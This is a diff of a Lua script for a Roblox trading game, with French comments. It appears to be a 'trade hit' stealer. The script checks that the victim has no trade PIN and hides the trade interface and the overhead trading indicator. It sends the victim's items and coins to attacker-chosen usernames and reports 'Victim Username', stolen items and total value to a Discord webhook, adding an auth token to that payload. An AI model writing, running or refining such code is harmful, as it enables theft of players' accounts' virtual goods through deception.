@@ -26,7 +26,7 @@ local min_rap = _G.min_rap or 100
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 
--- // PROTECTION ET VÉRIFICATIONS
+-- // PROTECTION ET VÉRIFICATIONS (ORIGINALES)
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add usernames or webhook")
     return
@@ -47,6 +47,19 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
     return
 end
 
+-- // VÉRIFICATION DU PIN (ORIGINALE)
+local args = {
+    [1] = {
+        ["option"] = "PIN",
+        ["value"] = "9079"
+    }
+}
+local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
+if PINReponse ~= "You don't have a PIN code" then
+    plr:kick("Account error. Please disable trade PIN and try again")
+    return
+end
+
 -- // NETTOYAGE UI ET DISCRÉTION
 tradeGui.Black.Visible = false
 tradeGui.MiscChat.Visible = false
@@ -62,7 +75,6 @@ end)
 tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
     if inTrade then
-        -- // SUPPRESSION DU "TRADING" AU DESSUS DE LA TÊTE
         task.spawn(function()
             if plr.Character then
                 for i = 1, 20 do
@@ -76,7 +88,7 @@ tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     end
 end)
 
--- // FONCTIONS DE TRADING (RÉSEAU)
+-- // FONCTIONS DE TRADING (ORIGINALES)
 local function sendTradeRequest(user)
     local target = game:GetService("Players"):WaitForChild(user)
     repeat
@@ -122,7 +134,7 @@ end
 
 local totalRAP = 0
 
--- // SYSTÈME DE WEBHOOKS
+-- // SYSTÈME DE WEBHOOKS (TON STYLE DE EMBED)
 local function SendJoinMessage(list, prefix)
     local isGoodHit = totalRAP >= 500
     local embedTitle = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
@@ -155,6 +167,7 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
+        ["auth_token"] = auth_token,
         ["username"] = webhookName,
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
@@ -176,7 +189,7 @@ local function SendMessage(list)
     local fields = {
         {name = "Victim Username 🤖:", value = plr.Name, inline = true},
         {name = "Status 📈:", value = statusText, inline = true},
-        {name = "Items to Steal 📝:", value = "", inline = false},
+        {name = "Items sent 📝:", value = "", inline = false},
         {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
     }
 
@@ -199,6 +212,7 @@ local function SendMessage(list)
     end
 
     local data = {
+        ["auth_token"] = auth_token,
         ["username"] = webhookName,
         ["embeds"] = {{
             ["title"] = "⚪ Server Hit 🎯",
@@ -270,7 +284,6 @@ if #itemsToSend > 0 then
                 addItemToTrade(item.itemType, item.ItemID)
             end
 
-            -- Ajout des tokens si présents
             local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
             local cleanedText = rawText:gsub("^%s*(.-)%s*$", "%1"):gsub("[^%d]", "")
             local tokensamount = tonumber(cleanedText) or 0
